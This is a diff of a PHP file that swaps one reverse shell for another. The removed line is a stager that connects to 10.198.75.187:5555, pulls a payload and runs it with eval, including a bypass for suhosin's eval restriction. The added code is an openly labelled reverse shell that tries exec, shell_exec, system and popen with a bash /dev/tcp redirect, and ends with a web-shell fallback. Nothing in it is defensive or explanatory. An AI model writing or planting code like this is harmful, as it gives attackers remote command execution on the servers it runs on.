@@ -1,1 +1,32 @@
-/*<?php /**/ error_reporting(0); $ip = '10.198.75.187'; $port = 5555; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
+<?php
+$ip = '10.198.75.187';  // Replace with your IP
+$port = '7777';         // Replace with your port
+
+// Try exec()
+if (function_exists('exec')) {
+    exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
+}
+// Try shell_exec()
+elseif (function_exists('shell_exec')) {
+    shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
+}
+// Try system()
+elseif (function_exists('system')) {
+    system("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
+}
+// Try popen()
+elseif (function_exists('popen')) {
+    popen("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'", "r");
+}
+// Try fsockopen()
+elseif (function_exists('fsockopen')) {
+    $socket = fsockopen($ip, $port);
+    if ($socket) {
+        shell_exec("/bin/sh -i <&3 >&3 2>&3");
+    }
+}
+// If none of the above works, use a web shell (fallback)
+else {
+    echo "<pre>Web shell is available. Execute commands with ?cmd=your_command</pre>";
+}
+?>
